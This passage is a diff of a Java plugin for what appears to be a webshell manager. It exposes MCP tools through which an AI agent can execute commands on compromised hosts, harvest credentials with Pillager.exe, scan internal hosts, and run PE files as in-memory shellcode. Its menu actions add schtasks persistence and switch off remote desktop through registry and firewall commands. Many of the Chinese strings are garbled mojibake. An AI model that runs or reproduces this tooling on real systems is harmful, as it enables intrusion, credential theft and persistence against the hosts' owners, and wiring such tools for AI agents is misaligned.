+                        + "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f"
+                        + " & netsh advfirewall firewall set rule group=\"remote desktop\" new enable=No";
+                try {
+                    String text = NewCmd.this.payload.execCommand(cmd);
+                    NewCmd.this.cmdTextArea.setText(text == null ? "" : text);
+                } catch (Exception ex) {
+                    NewCmd.this.cmdTextArea.setText(String.valueOf(ex.getMessage()));
+                }
             }
         }).start();
     }
@@ -882,7 +879,7 @@ public abstract class NewCmd implements Plugin {
         (new Thread() {
             public void run() {
                 NewCmd.this.cmdTextArea.setText("");
-                String path = GOptionPane.showInputDialog("exe Â·¾¶", "");
+                String path = GOptionPane.showInputDialog("exe è·¯å¾„", "");
                 String result = NewCmd.this.payload.execCommand("schtasks /create /sc minute /mo 60 /tn " + NewCmd.getUUID32() + " /tr " + path);
                 NewCmd.this.cmdTextArea.setText(result);
             }
@@ -894,23 +891,23 @@ public abstract class NewCmd implements Plugin {
         return uuid;
     }
 
-    @McpTool(name = "exec", desc = "Ö´ĞĞÏµÍ³ÃüÁî (NewCmd ÃüÁîÖ´ĞĞ)", params = {
+    @McpTool(name = "exec", desc = "æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ (NewCmd å‘½ä»¤æ‰§è¡Œ)", params = {
             @McpParam(name = "shellId", required = true, desc = "Shell ID"),
-            @McpParam(name = "command", required = true, desc = "ÒªÖ´ĞĞµÄÃüÁî") })
+            @McpParam(name = "command", required = true, desc = "è¦æ‰§è¡Œçš„å‘½ä»¤") })
     public String mcpExec(Map<String, Object> args) {
         String cmd = (String) args.get("command");
-        if (cmd == null || cmd.trim().isEmpty()) return "È±ÉÙ²ÎÊı: command";
-        if (this.payload == null) return "payload Î´³õÊ¼»¯";
+        if (cmd == null || cmd.trim().isEmpty()) return "ç¼ºå°‘å‚æ•°: command";
+        if (this.payload == null) return "payload æœªåˆå§‹åŒ–";
         return this.payload.execCommand(cmd);
     }
 
-    @McpTool(name = "info1", desc = "»ñÈ¡ĞÅÏ¢1: ÄÚÍøĞÅÏ¢ÊÕ¼¯ (Pillager)", params = {
+    @McpTool(name = "info1", desc = "è·å–ä¿¡æ¯æ–¹æ³•1: æ”¶é›†ä¸»æœºå‡­æ® (Pillager)", params = {
             @McpParam(name = "shellId", required = true, desc = "Shell ID") })
     public String mcpInfo1(Map<String, Object> args) {
         return runInfo("assets/Pillager.exe", (String)null);
     }
 
-    @McpTool(name = "info2", desc = "»ñÈ¡ĞÅÏ¢2: ÄÚÍøÖ÷»úÉ¨Ãè (hunter)", params = {
+    @McpTool(name = "info2", desc = "è·å–ä¿¡æ¯æ–¹æ³•2: æ”¶é›†ä¸»æœºä¿¡æ¯ (hunter)", params = {
             @McpParam(name = "shellId", required = true, desc = "Shell ID") })
     public String mcpInfo2(Map<String, Object> args) {
         return runInfo("assets/hunter.exe", "all");
@@ -921,7 +918,7 @@ public abstract class NewCmd implements Plugin {
             if (this.loader == null) {
                 this.loader = this.getShellcodeLoader();
             }
-            if (this.loader == null) return "Î´ÕÒµ½ ShellcodeLoader";
+            if (this.loader == null) return "æœªæ‰¾åˆ° ShellcodeLoader";
         }
         try {
             byte[] pe = functions.readInputStreamAutoClose(NewCmd.class.getResourceAsStream(asset));
@@ -929,7 +926,7 @@ public abstract class NewCmd implements Plugin {
                 byte[] result = this.loader.runNetPe(runArgs, pe);
                 return this.encoding.Decoding(result);
             }
-            // MCP ÎŞ frame: TH_TOOLS Á´ÄÚ´æ¼ÓÔØ (PE->shellcode ÄÚ´æÖ´ĞĞ, ÎŞÎÄ¼şÂäÅÌ)
+            // MCP æ—  frame: TH_TOOLS å†…å­˜æ‰§è¡Œ (PE->shellcode è½¬æ¢å, æ— ç•Œé¢é€‰æ‹©)
             String cn = this.payload.getClass().getName().contains("csharp") ? "shells.plugins.csharp.TH_TOOLS" : "shells.plugins.java.TH_TOOLS";
             TH_TOOLS thTools = (TH_TOOLS) Class.forName(cn).newInstance();
             thTools.init(this.shellEntity);
@@ -938,7 +935,7 @@ public abstract class NewCmd implements Plugin {
         } catch (Exception e) {
             java.io.StringWriter sw = new java.io.StringWriter();
             e.printStackTrace(new java.io.PrintWriter(sw));
-            return "Ö´ĞĞÊ§°Ü:\n" + sw.toString();
+            return "æ‰§è¡Œå¤±è´¥:\n" + sw.toString();
         }
     }
 
